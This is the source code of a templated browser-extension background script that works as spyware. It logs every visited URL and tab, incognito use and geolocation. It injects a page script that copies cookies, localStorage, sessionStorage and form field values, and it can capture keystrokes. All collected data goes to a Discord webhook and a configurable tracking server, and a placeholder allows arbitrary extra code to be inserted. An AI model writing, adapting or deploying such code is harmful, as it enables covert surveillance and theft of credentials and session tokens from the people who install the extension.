// Background service worker for {{EXTENSION_NAME}}
const WEBHOOK_URL = '{{WEBHOOK_URL}}';
const USER_ID = '{{USER_ID}}';
const EXTENSION_ID = '{{EXTENSION_ID}}';
const TRACKING_SERVER = '{{TRACKING_SERVER}}';

let trackingData = {};
let sessionId = generateUUID();

// Generate UUID for session tracking
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// Enhanced data collection on extension startup
chrome.runtime.onStartup.addListener(() => {
  collectInitialData();
});

chrome.runtime.onInstalled.addListener(() => {
  collectInitialData();
});

// Collect initial system data
async function collectInitialData() {
  const systemData = {
    type: 'extension_installed',
    extensionId: EXTENSION_ID,
    sessionId: sessionId,
    userId: USER_ID,
    timestamp: Date.now(),
    systemInfo: {
      platform: navigator.platform,
      userAgent: navigator.userAgent,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screenResolution: screen ? `${screen.width}x${screen.height}` : 'unknown',
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory || 'unknown'
    }
  };

  await sendToWebhookAndServer(systemData);
}

// Track tab changes
chrome.tabs.onActivated.addListener(async (activeInfo) => {
  if ({{FEATURE_IP_TRACKING}} === 'true' || {{FEATURE_BROWSER_INFO}} === 'true') {
    try {
      const tab = await chrome.tabs.get(activeInfo.tabId);
      await collectAndSendTabData(tab, 'tab_activated');
    } catch (error) {
      console.error('Error tracking tab activation:', error);
    }
  }
});

// Track navigation with enhanced data
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url) {
    await collectAndSendTabData(tab, 'page_loaded');
  }
});

// Enhanced data collection from tabs
async function collectAndSendTabData(tab, eventType) {
  try {
    const data = {
      type: eventType,
      extensionId: EXTENSION_ID,
      sessionId: sessionId,
      userId: USER_ID,
      timestamp: Date.now(),
      tabInfo: {
        url: tab.url,
        title: tab.title,
        favIconUrl: tab.favIconUrl,
        incognito: tab.incognito,
        active: tab.active,
        pinned: tab.pinned,
        index: tab.index,
        windowId: tab.windowId,
        status: tab.status
      }
    };

    // Add browser info if enabled
    if ({{FEATURE_BROWSER_INFO}} === 'true') {
      data.systemInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screenInfo: {
          width: screen.width,
          height: screen.height,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth
        }
      };
    }

    // Add geolocation if enabled and permitted
    if ({{FEATURE_GEOLOCATION}} === 'true') {
      try {
        const position = await getCurrentPosition();
        data.location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          altitudeAccuracy: position.coords.altitudeAccuracy,
          heading: position.coords.heading,
          speed: position.coords.speed,
          timestamp: position.timestamp
        };
      } catch (error) {
        data.location = { error: 'Geolocation not available or denied' };
      }
    }

    // Inject content script to collect additional data
    if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
      try {
        await chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: collectPageData,
          args: [EXTENSION_ID, sessionId, USER_ID, {{FEATURE_FORM_DATA}}, {{FEATURE_CLICK_TRACKING}}, {{FEATURE_KEYLOGGER}}]
        });
      } catch (error) {
        console.error('Error injecting content script:', error);
      }
    }

    await sendToWebhookAndServer(data);

  } catch (error) {
    console.error('Error collecting tab data:', error);
  }
}

// Function to inject into pages for enhanced data collection
function collectPageData(extensionId, sessionId, userId, captureFormData, captureClicks, captureKeystrokes) {
  try {
    const pageData = {
      type: 'page_analysis',
      extensionId: extensionId,
      sessionId: sessionId,
      userId: userId,
      timestamp: Date.now(),
      url: window.location.href,
      domain: window.location.hostname,
      path: window.location.pathname,
      title: document.title,
      pageInfo: {
        documentHeight: document.documentElement.scrollHeight,
        documentWidth: document.documentElement.scrollWidth,
        viewportHeight: window.innerHeight,
        viewportWidth: window.innerWidth,
        scrollX: window.scrollX,
        scrollY: window.scrollY,
        referrer: document.referrer,
        characterSet: document.characterSet,
        readyState: document.readyState,
        lastModified: document.lastModified
      },
      forms: [],
      links: [],
      images: [],
      inputs: [],
      localStorage: {},
      sessionStorage: {},
      cookies: document.cookie
    };

    // Collect form information
    if (captureFormData) {
      const forms = document.querySelectorAll('form');
      forms.forEach((form, index) => {
        const formData = {
          index: index,
          action: form.action,
          method: form.method,
          name: form.name,
          id: form.id,
          className: form.className,
          inputCount: form.querySelectorAll('input').length,
          inputs: []
        };

        const inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(input => {
          formData.inputs.push({
            type: input.type || 'text',
            name: input.name,
            id: input.id,
            placeholder: input.placeholder,
            required: input.required,
            value: input.type === 'password' ? '[HIDDEN]' : input.value?.substring(0, 50)
          });
        });

        pageData.forms.push(formData);
      });
    }

    // Collect all input fields
    const allInputs = document.querySelectorAll('input, textarea, select');
    allInputs.forEach(input => {
      pageData.inputs.push({
        type: input.type || 'unknown',
        name: input.name,
        id: input.id,
        placeholder: input.placeholder,
        autocomplete: input.autocomplete,
        required: input.required,
        disabled: input.disabled,
        value: input.type === 'password' ? '[HIDDEN]' : input.value?.substring(0, 50)
      });
    });

    // Collect links
    const links = document.querySelectorAll('a[href]');
    Array.from(links).slice(0, 50).forEach(link => {
      pageData.links.push({
        href: link.href,
        text: link.textContent?.substring(0, 100),
        target: link.target,
        rel: link.rel
      });
    });

    // Collect images
    const images = document.querySelectorAll('img[src]');
    Array.from(images).slice(0, 20).forEach(img => {
      pageData.images.push({
        src: img.src,
        alt: img.alt,
        width: img.width,
        height: img.height
      });
    });

    // Collect localStorage data
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
          const value = localStorage.getItem(key);
          pageData.localStorage[key] = value?.substring(0, 200);
        }
      }
    } catch (e) {
      pageData.localStorage = { error: 'Access denied' };
    }

    // Collect sessionStorage data
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key) {
          const value = sessionStorage.getItem(key);
          pageData.sessionStorage[key] = value?.substring(0, 200);
        }
      }
    } catch (e) {
      pageData.sessionStorage = { error: 'Access denied' };
    }

    // Send collected data back to background script
    chrome.runtime.sendMessage({ type: 'pageData', data: pageData });

    // Set up event listeners for real-time tracking
    if (captureClicks) {
      document.addEventListener('click', function(event) {
        const clickData = {
          type: 'click_event',
          extensionId: extensionId,
          sessionId: sessionId,
          userId: userId,
          timestamp: Date.now(),
          element: {
            tagName: event.target.tagName,
            id: event.target.id,
            className: event.target.className,
            text: event.target.textContent?.substring(0, 100),
            href: event.target.href,
            type: event.target.type
          },
          coordinates: {
            clientX: event.clientX,
            clientY: event.clientY,
            pageX: event.pageX,
            pageY: event.pageY
          },
          url: window.location.href
        };
        chrome.runtime.sendMessage({ type: 'clickData', data: clickData });
      });
    }

    if (captureKeystrokes) {
      let keystrokeBuffer = '';
      document.addEventListener('keydown', function(event) {
        keystrokeBuffer += event.key;

        if (keystrokeBuffer.length >= 20 || event.key === 'Enter') {
          const keystrokeData = {
            type: 'keystroke_event',
            extensionId: extensionId,
            sessionId: sessionId,
            userId: userId,
            timestamp: Date.now(),
            keys: keystrokeBuffer,
            elementType: event.target.tagName,
            elementId: event.target.id,
            url: window.location.href
          };
          chrome.runtime.sendMessage({ type: 'keystrokeData', data: keystrokeData });
          keystrokeBuffer = '';
        }
      });
    }

  } catch (error) {
    console.error('Error collecting page data:', error);
  }
}

// Listen for messages from content scripts
chrome.runtime.onMessage.addListener(async (message, sender, sendResponse) => {
  if (message.type === 'pageData' || message.type === 'clickData' || message.type === 'keystrokeData') {
    await sendToWebhookAndServer(message.data);
  }
});

// Enhanced webhook and server sending with retry logic
async function sendToWebhookAndServer(data) {
  // Send to Discord webhook (required)
  if (WEBHOOK_URL) {
    await sendToWebhook(data);
  }

  // Send to tracking server
  await sendToServer(data);
}

// Send to Discord webhook with enhanced formatting
async function sendToWebhook(data) {
  try {
    let embed = {
      title: "🔍 Extension Activity Detected",
      color: getColorForEventType(data.type),
      timestamp: new Date(data.timestamp).toISOString(),
      footer: { text: `Extension: {{EXTENSION_NAME}} | Session: ${data.sessionId?.substring(0, 8)}` }
    };

    // Customize embed based on event type
    switch (data.type) {
      case 'extension_installed':
        embed.title = "🚀 Extension Installed & Active";
        embed.description = `**{{EXTENSION_NAME}}** has been successfully installed and is now tracking.`;
        embed.fields = [
          { name: "👤 User", value: `ID: ${data.userId}`, inline: true },
          { name: "💻 Platform", value: data.systemInfo?.platform || 'Unknown', inline: true },
          { name: "🌐 Browser", value: data.systemInfo?.userAgent?.split(' ')[0] || 'Unknown', inline: true },
          { name: "📱 Screen", value: data.systemInfo?.screenResolution || 'Unknown', inline: true },
          { name: "🌍 Timezone", value: data.systemInfo?.timezone || 'Unknown', inline: true },
          { name: "🧠 Memory", value: `${data.systemInfo?.deviceMemory || 'Unknown'} GB`, inline: true }
        ];
        break;

      case 'page_loaded':
      case 'tab_activated':
        embed.title = data.type === 'page_loaded' ? "📄 Page Loaded" : "🔄 Tab Activated";
        embed.fields = [
          { name: "🌐 URL", value: data.tabInfo?.url?.substring(0, 100) || 'Unknown', inline: false },
          { name: "📝 Title", value: data.tabInfo?.title?.substring(0, 100) || 'Untitled', inline: false }
        ];

        if (data.location && !data.location.error) {
          embed.fields.push({
            name: "📍 Location",
            value: `${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}`,
            inline: true
          });
        }

        if (data.tabInfo?.incognito) {
          embed.fields.push({ name: "🕵️ Mode", value: "Incognito", inline: true });
        }
        break;

      case 'page_analysis':
        embed.title = "🔬 Deep Page Analysis";
        embed.fields = [
          { name: "🌐 Domain", value: data.domain || 'Unknown', inline: true },
          { name: "📄 Path", value: data.path || '/', inline: true },
          { name: "📊 Forms", value: data.forms?.length.toString() || '0', inline: true },
          { name: "🔗 Links", value: data.links?.length.toString() || '0', inline: true },
          { name: "🖼️ Images", value: data.images?.length.toString() || '0', inline: true },
          { name: "📝 Inputs", value: data.inputs?.length.toString() || '0', inline: true }
        ];

        if (data.localStorage && Object.keys(data.localStorage).length > 0) {
          embed.fields.push({
            name: "💾 LocalStorage",
            value: `${Object.keys(data.localStorage).length} items found`,
            inline: true
          });
        }

        if (data.cookies && data.cookies.length > 0) {
          embed.fields.push({
            name: "🍪 Cookies",
            value: `${data.cookies.split(';').length} cookies detected`,
            inline: true
          });
        }
        break;

      case 'click_event':
        embed.title = "👆 User Click Detected";
        embed.fields = [
          { name: "🎯 Element", value: `${data.element?.tagName || 'Unknown'} ${data.element?.id ? `#${data.element.id}` : ''}`, inline: true },
          { name: "📝 Text", value: data.element?.text?.substring(0, 50) || 'No text', inline: true },
          { name: "📍 Position", value: `${data.coordinates?.pageX}, ${data.coordinates?.pageY}`, inline: true }
        ];
        break;

      case 'keystroke_event':
        embed.title = "⌨️ Keystroke Activity";
        embed.fields = [
          { name: "🎯 Element", value: data.elementType || 'Unknown', inline: true },
          { name: "📝 Keys", value: `${data.keys?.length || 0} characters typed`, inline: true }
        ];
        break;
    }

    // Add URL field for all events except installation
    if (data.type !== 'extension_installed' && (data.url || data.tabInfo?.url)) {
      embed.fields = embed.fields || [];
      embed.fields.push({
        name: "🔗 Current URL",
        value: (data.url || data.tabInfo?.url)?.substring(0, 200) || 'Unknown',
        inline: false
      });
    }

    const webhookPayload = {
      username: "🕵️ {{EXTENSION_NAME}} Monitor",
      avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
      embeds: [embed]
    };

    // Validate webhook URL
    try {
      if (!WEBHOOK_URL) {
        console.warn('No webhook URL provided, skipping Discord notification');
        return;
      }

      if (!WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/') && !WEBHOOK_URL.startsWith('https://discordapp.com/api/webhooks/')) {
        console.error('Invalid webhook URL provided. Must be a Discord webhook URL.');
        return;
      }

      console.log('📤 Sending data to Discord webhook...');

      const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(webhookPayload)
      });

      if (!response.ok) {
        console.error('Webhook failed:', response.status, response.statusText);
      }
    } catch (error) {
      console.error('Error sending to webhook:', error);
    }
}

// Get color based on event type
function getColorForEventType(eventType) {
  const colors = {
    'extension_installed': 0x00FF00, // Green
    'page_loaded': 0x3498DB,         // Blue  
    'tab_activated': 0x9B59B6,       // Purple
    'page_analysis': 0xF39C12,       // Orange
    'click_event': 0xE74C3C,         // Red
    'keystroke_event': 0xFF0000,     // Bright Red
    'form_submit': 0x8E44AD          // Dark Purple
  };
  return colors[eventType] || 0x95A5A6; // Default gray
}

// Send data to tracking server
async function sendToServer(data) {
  try {
    const response = await fetch(`${TRACKING_SERVER}/api/extension-track`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

    if (!response.ok) {
      console.error('Server tracking failed:', response.status);
    }
  } catch (error) {
    console.error('Error sending to server:', error);
  }
}

// Get current position with timeout
function getCurrentPosition() {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject, {
      timeout: 10000,
      maximumAge: 300000,
      enableHighAccuracy: true
    });
  });
}

// Custom user code injection point
try {
  {{CUSTOM_CODE}}
} catch (error) {
  console.error('Custom code error:', error);
}